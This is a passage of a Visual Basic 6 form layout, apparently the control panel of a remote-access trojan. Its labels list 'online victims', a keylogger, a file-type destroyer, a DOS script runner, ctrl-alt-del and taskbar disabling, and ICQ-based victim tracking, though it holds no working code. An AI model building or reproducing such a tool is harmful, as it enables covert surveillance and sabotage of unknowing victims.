            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00C0C000&
         Height          =   240
         Index           =   1
         Left            =   2820
         TabIndex        =   171
         Top             =   2400
         Width           =   1215
      End
      Begin VB.Label lblAkOp 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "show picture"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00C0C000&
         Height          =   240
         Index           =   0
         Left            =   2715
         TabIndex        =   169
         Top             =   1920
         Width           =   1455
      End
      Begin VB.Label Label14 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "VISUAL/ACOUSTIC"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   21.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404080&
         Height          =   495
         Left            =   1545
         TabIndex        =   168
         Top             =   0
         Width           =   3855
      End
      Begin VB.Shape shpHintergrundServer 
         BackColor       =   &H00808000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   3435
         Index           =   16
         Left            =   0
         Top             =   720
         Width           =   6915
      End
   End
   Begin VB.PictureBox picContainer 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H80000008&
      Height          =   4215
      Index           =   38
      Left            =   2760
      ScaleHeight     =   4185
      ScaleWidth      =   6945
      TabIndex        =   374
      Top             =   480
      Visible         =   0   'False
      Width           =   6975
      Begin VB.Timer Timer4 
         Enabled         =   0   'False
         Interval        =   6000
         Left            =   6000
         Top             =   120
      End
      Begin VB.PictureBox TcpWho 
         Height          =   480
         Index           =   0
         Left            =   5520
         ScaleHeight     =   420
         ScaleWidth      =   1140
         TabIndex        =   419
         Top             =   120
         Width           =   1200
      End
      Begin VB.ListBox List8 
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         ForeColor       =   &H00FFFFC0&
         Height          =   870
         Left            =   240
         Sorted          =   -1  'True
         TabIndex        =   385
         Top             =   3120
         Width           =   6615
      End
      Begin VB.ListBox List7 
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         ForeColor       =   &H00FFFFC0&
         Height          =   870
         Left            =   240
         Sorted          =   -1  'True
         TabIndex        =   383
         Top             =   2040
         Width           =   6615
      End
      Begin VB.TextBox txttextfelder 
         Alignment       =   1  'Right Justify
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFC0&
         Height          =   285
         Index           =   41
         Left            =   240
         TabIndex        =   376
         Top             =   720
         Width           =   2295
      End
      Begin VB.TextBox txttextfelder 
         Alignment       =   1  'Right Justify
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFC0&
         Height          =   285
         Index           =   40
         Left            =   240
         TabIndex        =   375
         Top             =   1080
         Width           =   2295
      End
      Begin VB.Label Label42 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "online victims:"
         ForeColor       =   &H00C0C000&
         Height          =   210
         Index           =   1
         Left            =   240
         TabIndex        =   386
         Top             =   2880
         Width           =   1575
      End
      Begin VB.Label Label42 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "all victims:"
         ForeColor       =   &H00C0C000&
         Height          =   210
         Index           =   0
         Left            =   240
         TabIndex        =   384
         Top             =   1800
         Width           =   1260
      End
      Begin VB.Label lblueberschrift 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "delete from list"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   11.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   255
         Index           =   39
         Left            =   4305
         TabIndex        =   382
         Top             =   1455
         Width           =   2430
      End
      Begin VB.Label lblueberschrift 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "Who is online..."
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   11.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   255
         Index           =   38
         Left            =   1545
         TabIndex        =   381
         Top             =   1455
         Width           =   2430
      End
      Begin VB.Label lblStandart 
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   "enter a name"
         ForeColor       =   &H00C0C000&
         Height          =   210
         Index           =   11
         Left            =   2640
         TabIndex        =   380
         Top             =   1080
         Width           =   1260
      End
      Begin VB.Label Label41 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "SERVER LIST"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   21.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404080&
         Height          =   495
         Left            =   2205
         TabIndex        =   379
         Top             =   0
         Width           =   2835
      End
      Begin VB.Label lblStandart 
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   "enter ICQ UIN here"
         ForeColor       =   &H00C0C000&
         Height          =   210
         Index           =   8
         Left            =   2640
         TabIndex        =   378
         Top             =   720
         Width           =   1890
      End
      Begin VB.Label lblueberschrift 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "add"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   11.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   255
         Index           =   5
         Left            =   360
         TabIndex        =   377
         Top             =   1455
         Width           =   765
      End
      Begin VB.Shape shpueberschrift 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   300
         Index           =   5
         Left            =   285
         Shape           =   2  'Oval
         Top             =   1440
         Width           =   930
      End
      Begin VB.Shape shpueberschrift 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   300
         Index           =   38
         Left            =   1440
         Shape           =   2  'Oval
         Top             =   1440
         Width           =   2655
      End
      Begin VB.Shape shpueberschrift 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   300
         Index           =   39
         Left            =   4200
         Shape           =   2  'Oval
         Top             =   1440
         Width           =   2655
      End
      Begin VB.Shape shpHintergrundServer 
         BackColor       =   &H00808000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   3435
         Index           =   39
         Left            =   120
         Top             =   600
         Width           =   6915
      End
   End
   Begin VB.PictureBox picContainer 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H80000008&
      Height          =   4215
      Index           =   39
      Left            =   2760
      ScaleHeight     =   4185
      ScaleWidth      =   6945
      TabIndex        =   388
      Top             =   480
      Visible         =   0   'False
      Width           =   6975
      Begin VB.TextBox txttextfelder 
         Alignment       =   1  'Right Justify
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFC0&
         Height          =   285
         Index           =   42
         Left            =   2640
         TabIndex        =   389
         Text            =   "bmp"
         Top             =   1680
         Width           =   1575
      End
      Begin VB.Label lblStandart 
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   "*."
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   15.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   345
         Index           =   16
         Left            =   2160
         TabIndex        =   393
         Top             =   1680
         Width           =   390
      End
      Begin VB.Label lblStandart 
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   "You can ""destroy"" a file-typ. for examble: destroy the file-typ *.bmp, then the user  cannot start any *.bmp file..."
         ForeColor       =   &H00404000&
         Height          =   600
         Index           =   20
         Left            =   240
         TabIndex        =   392
         Top             =   720
         Width           =   6645
         WordWrap        =   -1  'True
      End
      Begin VB.Label Label43 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "DESTROY *.XXX"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   21.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404080&
         Height          =   495
         Left            =   1950
         TabIndex        =   391
         Top             =   0
         Width           =   3345
      End
      Begin VB.Label lblueberschrift 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "destroy"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   14.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   390
         Index           =   40
         Left            =   2520
         TabIndex        =   390
         Top             =   2535
         Width           =   1935
      End
      Begin VB.Shape shpueberschrift 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   435
         Index           =   40
         Left            =   2400
         Shape           =   2  'Oval
         Top             =   2520
         Width           =   2175
      End
      Begin VB.Shape shpHintergrundServer 
         BackColor       =   &H00808000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   3435
         Index           =   40
         Left            =   120
         Top             =   600
         Width           =   6915
      End
   End
   Begin VB.PictureBox picContainer 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H80000008&
      Height          =   4215
      Index           =   29
      Left            =   2760
      ScaleHeight     =   4185
      ScaleWidth      =   6945
      TabIndex        =   254
      Top             =   480
      Visible         =   0   'False
      Width           =   6975
      Begin VB.Label lblextras 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackColor       =   &H00808000&
         BackStyle       =   0  'Transparent
         Caption         =   "enter"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   240
         Index           =   10
         Left            =   5700
         TabIndex        =   395
         Top             =   2760
         Width           =   615
      End
      Begin VB.Label Label18 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Visual/acoustic"
         ForeColor       =   &H00FFFF00&
         Height          =   210
         Index           =   5
         Left            =   5160
         TabIndex        =   394
         Top             =   2520
         Width           =   1575
      End
      Begin VB.Label lblextras 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackColor       =   &H00808000&
         BackStyle       =   0  'Transparent
         Caption         =   "get/set..."
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   240
         Index           =   9
         Left            =   480
         TabIndex        =   359
         Top             =   2880
         Width           =   1215
      End
      Begin VB.Label Label18 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "date/time"
         ForeColor       =   &H00FFFF00&
         Height          =   210
         Index           =   4
         Left            =   480
         TabIndex        =   358
         Top             =   2520
         Width           =   945
      End
      Begin VB.Label lblextras 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackColor       =   &H00808000&
         BackStyle       =   0  'Transparent
         Caption         =   "flip screen"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   240
         Index           =   8
         Left            =   3120
         TabIndex        =   284
         Top             =   3120
         Width           =   1335
      End
      Begin VB.Label lblextras 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackColor       =   &H00808000&
         BackStyle       =   0  'Transparent
         Caption         =   "change resolution"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   240
         Index           =   7
         Left            =   2760
         TabIndex        =   276
         Top             =   3480
         Width           =   2055
      End
      Begin VB.Label lblextras 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackColor       =   &H00808000&
         BackStyle       =   0  'Transparent
         Caption         =   "freeze"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   240
         Index           =   6
         Left            =   3360
         TabIndex        =   275
         Top             =   2760
         Width           =   735
      End
      Begin VB.Label Label18 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Screen"
         ForeColor       =   &H00FFFF00&
         Height          =   210
         Index           =   3
         Left            =   3360
         TabIndex        =   274
         Top             =   2520
         Width           =   630
      End
      Begin VB.Label Label18 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "taskbar"
         ForeColor       =   &H00FFFF00&
         Height          =   210
         Index           =   2
         Left            =   5520
         TabIndex        =   264
         Top             =   840
         Width           =   735
      End
      Begin VB.Label Label18 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "ctrl-alt-del"
         ForeColor       =   &H00FFFF00&
         Height          =   210
         Index           =   1
         Left            =   2880
         TabIndex        =   263
         Top             =   840
         Width           =   1260
      End
      Begin VB.Label Label18 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "cd-rom"
         ForeColor       =   &H00FFFF00&
         Height          =   210
         Index           =   0
         Left            =   480
         TabIndex        =   262
         Top             =   840
         Width           =   630
      End
      Begin VB.Label lblextras 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackColor       =   &H00808000&
         BackStyle       =   0  'Transparent
         Caption         =   "show"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   240
         Index           =   2
         Left            =   5640
         TabIndex        =   261
         Top             =   1680
         Width           =   495
      End
      Begin VB.Label lblextras 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackColor       =   &H00808000&
         BackStyle       =   0  'Transparent
         Caption         =   "hide"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   240
         Index           =   3
         Left            =   5640
         TabIndex        =   260
         Top             =   1320
         Width           =   495
      End
      Begin VB.Label lblextras 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackColor       =   &H00808000&
         BackStyle       =   0  'Transparent
         Caption         =   "off"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   240
         Index           =   5
         Left            =   3330
         TabIndex        =   259
         Top             =   1560
         Width           =   375
      End
      Begin VB.Label lblextras 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackColor       =   &H00808000&
         BackStyle       =   0  'Transparent
         Caption         =   "on"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   240
         Index           =   4
         Left            =   3360
         TabIndex        =   258
         Top             =   1200
         Width           =   255
      End
      Begin VB.Label lblextras 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackColor       =   &H00808000&
         BackStyle       =   0  'Transparent
         Caption         =   "open"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   240
         Index           =   0
         Left            =   615
         TabIndex        =   257
         Top             =   1320
         Width           =   495
      End
      Begin VB.Label lblextras 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackColor       =   &H00808000&
         BackStyle       =   0  'Transparent
         Caption         =   "close"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   240
         Index           =   1
         Left            =   570
         TabIndex        =   256
         Top             =   1680
         Width           =   615
      End
      Begin VB.Label Label27 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "XTRAS"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   21.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404080&
         Height          =   495
         Left            =   2820
         TabIndex        =   255
         Top             =   0
         Width           =   1305
      End
      Begin VB.Shape shpHintergrundServer 
         BackColor       =   &H00808000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   3555
         Index           =   29
         Left            =   0
         Top             =   600
         Width           =   6915
      End
   End
   Begin VB.PictureBox picContainer 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H80000008&
      Height          =   4215
      Index           =   26
      Left            =   2760
      ScaleHeight     =   4185
      ScaleWidth      =   6945
      TabIndex        =   224
      Top             =   480
      Visible         =   0   'False
      Width           =   6975
      Begin VB.TextBox txttextfelder 
         Appearance      =   0  'Flat
         BackColor       =   &H00C0C000&
         Height          =   2535
         Index           =   28
         Left            =   120
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   228
         Text            =   "ds3English!.frx":5C2F
         Top             =   840
         Width           =   6735
      End
      Begin VB.Label lblServerUeberschrift 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "DOS SCRIBT"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   21.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404080&
         Height          =   495
         Index           =   0
         Left            =   2190
         TabIndex        =   227
         Top             =   0
         Width           =   2565
      End
      Begin VB.Label lblueberschrift 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "Yeah"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   14.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   390
         Index           =   31
         Left            =   5400
         TabIndex        =   226
         Top             =   3480
         Width           =   1335
      End
      Begin VB.Label Label24 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "type the script:"
         ForeColor       =   &H00404000&
         Height          =   210
         Left            =   120
         TabIndex        =   225
         Top             =   600
         Width           =   1680
      End
      Begin VB.Shape shpueberschrift 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   435
         Index           =   31
         Left            =   5280
         Shape           =   2  'Oval
         Top             =   3465
         Width           =   1575
      End
      Begin VB.Shape shpHintergrundServer 
         BackColor       =   &H00808000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   3420
         Index           =   28
         Left            =   0
         Top             =   600
         Width           =   7035
      End
   End
   Begin VB.PictureBox picContainer 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H80000008&
      Height          =   4215
      Index           =   11
      Left            =   2760
      ScaleHeight     =   4185
      ScaleWidth      =   6945
      TabIndex        =   135
      Top             =   480
      Visible         =   0   'False
      Width           =   6975
      Begin VB.Label lblMaus 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "restore buttons"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   12
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00C0C000&
         Height          =   270
         Index           =   1
         Left            =   120
         TabIndex        =   141
         Top             =   3120
         Width           =   2250
      End
      Begin VB.Label lblMaus 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "swap buttons"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   12
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00C0C000&
         Height          =   270
         Index           =   0
         Left            =   120
         TabIndex        =   140
         Top             =   2640
         Width           =   1800
      End
      Begin VB.Label lblHinweiszuServerEinstellungen 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Fun with the buttons..."
         ForeColor       =   &H00404000&
         Height          =   210
         Index           =   14
         Left            =   120
         TabIndex        =   139
         Top             =   2040
         Width           =   2415
      End
      Begin VB.Label lblHinweiszuServerEinstellungen 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Click ""Spring!"" to move the mouse-coursor to upper left."
         ForeColor       =   &H00404000&
         Height          =   210
         Index           =   13
         Left            =   120
         TabIndex        =   138
         Top             =   720
         Width           =   5880
      End
      Begin VB.Label lblueberschrift 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "set cursor"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   14.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   390
         Index           =   13
         Left            =   2400
         TabIndex        =   137
         Top             =   1335
         Width           =   1935
      End
      Begin VB.Label Label9 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "MOUSE"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   21.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404080&
         Height          =   495
         Left            =   2865
         TabIndex        =   136
         Top             =   0
         Width           =   1305
      End
      Begin VB.Shape shpueberschrift 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   435
         Index           =   13
         Left            =   2280
         Shape           =   2  'Oval
         Top             =   1320
         Width           =   2175
      End
      Begin VB.Shape shpHintergrundServer 
         BackColor       =   &H00808000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   3435
         Index           =   12
         Left            =   0
         Top             =   600
         Width           =   6915
      End
   End
   Begin VB.PictureBox picContainer 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H80000008&
      Height          =   4215
      Index           =   18
      Left            =   2760
      ScaleHeight     =   4185
      ScaleWidth      =   6945
      TabIndex        =   178
      Top             =   480
      Visible         =   0   'False
      Width           =   6975
      Begin VB.TextBox Text2 
         Appearance      =   0  'Flat
         BackColor       =   &H00404000&
         ForeColor       =   &H00FFFFC0&
         Height          =   2895
         Left            =   120
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   179
         Top             =   720
         Width           =   6615
      End
      Begin VB.Label lblueberschrift 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "off"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   11.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   255
         Index           =   16
         Left            =   4560
         TabIndex        =   180
         Top             =   3735
         Width           =   2025
      End
      Begin VB.Label lblueberschrift 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "on"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   11.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   255
         Index           =   19
         Left            =   240
         TabIndex        =   182
         Top             =   3735
         Width           =   2025
      End
      Begin VB.Label Label16 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "KEYLOGGER"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   21.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404080&
         Height          =   495
         Left            =   2310
         TabIndex        =   181
         Top             =   0
         Width           =   2325
      End
      Begin VB.Shape shpueberschrift 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   300
         Index           =   19
         Left            =   120
         Shape           =   2  'Oval
         Top             =   3720
         Width           =   2295
      End
      Begin VB.Shape shpueberschrift 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   300
         Index           =   16
         Left            =   4440
         Shape           =   2  'Oval
         Top             =   3720
         Width           =   2295
      End
      Begin VB.Shape shpHintergrundServer 
         BackColor       =   &H00808000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   3555
         Index           =   18
         Left            =   0
         Top             =   600
         Width           =   6915
      End
   End
   Begin VB.PictureBox picContainer 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H80000008&
      Height          =   4215
      Index           =   37
      Left            =   2760
      ScaleHeight     =   4185
      ScaleWidth      =   6945
      TabIndex        =   360
      Top             =   480
      Visible         =   0   'False
      Width           =   6975
      Begin VB.TextBox txttextfelder 
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         ForeColor       =   &H00FFFF80&
         Height          =   1215
         Index           =   34
         Left            =   240
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   365
         Top             =   2640
         Width           =   6495
      End
      Begin VB.Label lblICQ 
         AutoSize        =   -1  'True
         BackColor       =   &H00808000&
         BackStyle       =   0  'Transparent
         Caption         =   "send message with victims UIN"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   480
         Index           =   8
         Left            =   4080
         TabIndex        =   396
         Top             =   1800
         Width           =   1950
         WordWrap        =   -1  'True
      End
      Begin VB.Label lblICQ 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackColor       =   &H00808000&
         BackStyle       =   0  'Transparent
         Caption         =   "show data of spec. UIN"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   240
         Index           =   7
         Left            =   4080
         TabIndex        =   370
         Top             =   1440
         Width           =   2655
      End
      Begin VB.Label lblICQ 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackColor       =   &H00808000&
         BackStyle       =   0  'Transparent
         Caption         =   "get group"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   240
         Index           =   6
         Left            =   4080
         TabIndex        =   369
         Top             =   720
         Width           =   1095
      End
      Begin VB.Label lblICQ 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackColor       =   &H00808000&
